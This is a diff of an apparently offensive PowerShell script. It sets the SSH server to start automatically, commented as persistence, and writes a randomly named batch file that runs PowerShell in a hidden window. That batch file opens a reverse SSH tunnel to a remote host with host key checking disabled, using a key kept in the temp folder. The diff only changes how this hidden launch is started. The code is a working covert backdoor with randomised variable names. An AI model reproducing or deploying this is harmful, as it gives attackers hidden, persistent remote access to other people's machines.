@@ -68,7 +68,8 @@ Set-Service -Name sshd -StartupType 'Automatic' # Persistence
 $GlNweBEFmh = Get-RandomAlphanumericString
 $NyZnoLKCIs = Get-Location
 Add-Content -Path "$NyZnoLKCIs/$GlNweBEFmh.cmd" -Value "@echo off"
-Add-Content -Path "$NyZnoLKCIs/$GlNweBEFmh.cmd" -Value "powershell powershell.exe -windowstyle hidden -ep bypass `"ssh -o ServerAliveInterval=30 -o StrictHostKeyChecking=no -R $YlEQgBmePn`:localhost:22 $dERQpoZWxz -i `$env:temp\key`""
+#Add-Content -Path "$NyZnoLKCIs/$GlNweBEFmh.cmd" -Value "powershell powershell.exe -windowstyle hidden -ep bypass `"ssh -o ServerAliveInterval=30 -o StrictHostKeyChecking=no -R $YlEQgBmePn`:localhost:22 $dERQpoZWxz -i `$env:temp\key`""
+Add-Content -Path "$NyZnoLKCIs/$GlNweBEFmh.cmd" -Value "start /min powershell.exe -windowstyle hidden -Command `"ssh -o ServerAliveInterval=30 -o StrictHostKeyChecking=no -R $YlEQgBmePn`:localhost:22 $dERQpoZWxz -i `$env:temp\key`""
 # informations
 
 Set-Location $temp
